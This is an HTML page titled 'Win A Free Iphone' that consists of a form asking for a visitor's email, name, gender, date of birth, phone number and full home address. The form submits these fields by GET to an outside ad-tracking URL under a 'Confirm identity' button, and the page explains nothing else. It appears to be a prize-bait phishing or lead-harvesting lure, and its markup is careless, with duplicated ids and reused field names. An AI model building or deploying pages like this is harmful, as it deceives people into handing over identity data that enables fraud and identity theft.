<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Win A Free Iphone</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="bootstrap.css">
    <link rel="stylesheet" type="text/css" href="styles.css" />
    <script src="main.js"></script>
</head>
<body>

 

    <form action="http://ads.g4-tracking.com/SHCCz" method="GET">
            <div class="form-group">
              <label for="exampleFormControlInput1">Email address</label>
              <input name='email' type="email" class="form-control" id="exampleFormControlInput1" placeholder="name@example.com">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">First Name</label>
                    <input name='firstname' type="text" class="form-control" id="exampleFormControlInput1" placeholder="First Name">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">Last Name</label>
                    <input name='lastname' type="text" class="form-control" id="exampleFormControlInput1" placeholder="Last Name">
            </div>

            
                <!-- Gendr goes here later -->

                <div class="form-group">
              <label for="exampleFormControlSelect1">Gender</label>
              <select name="gender" class="form-control" id="exampleFormControlSelect1">
                <option value="M">Male</option>
                <option value="F">Female </option>
              </select>
            </div>
            

            <div class="form-group">
                    <label for="exampleFormControlInput1">Date of birth Month</label>
                    <input name='dobmonth' type="number" class="form-control" id="exampleFormControlInput1" placeholder="Enter your month of birth">
            </div>
            
            <div class="form-group">
                    <label for="exampleFormControlInput1">Date of birth day</label>
                    <input name='dobday' type="number" class="form-control" id="exampleFormControlInput1" placeholder="Enter your day of birth">
            </div>
            <div class="form-group">
                    <label for="exampleFormControlInput1">Date of birth year</label>
                    <input name='dobyear' type="number" class="form-control" id="exampleFormControlInput1" placeholder="Enter your year of birth">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">Phonecode</label>
                    <input name='phonecode' type="number" class="form-control" id="exampleFormControlInput1" placeholder="Enter your phone code">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">Phone Prefix</label>
                    <input name='phoneprefix' type="number" class="form-control" id="exampleFormControlInput1" placeholder="Enter your phone code">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">Phone Suffix</label>
                    <input name='phoneprefix' type="number" class="form-control" id="exampleFormControlInput1" placeholder="Enter your phone code">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">Address1</label>
                    <input name='address1' type="text" class="form-control" id="exampleFormControlInput1" 
                    placeholder="Enter your home address">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">Address2</label>
                    <input name='address1' type="text" class="form-control" value="United States" id="exampleFormControlInput1" 
                    placeholder="Enter your country">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">City</label>
                    <input name='city' type="text" class="form-control" id="exampleFormControlInput1" 
                    placeholder="New York">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">State</label>
                    <input name='state' type="text" class="form-control" id="exampleFormControlInput1" 
                    placeholder="NY">
            </div>

            <div class="form-group">
                    <label for="exampleFormControlInput1">Zippost</label>
                    <input name='zippost' type="text" class="form-control" id="exampleFormControlInput1" 
                    placeholder="Enter your zip code">
            </div>
  
            <button type="submit" class="btn btn-primary btn-sm btn-block">Confirm identity</button>
          </form>

   
</body>
</html>
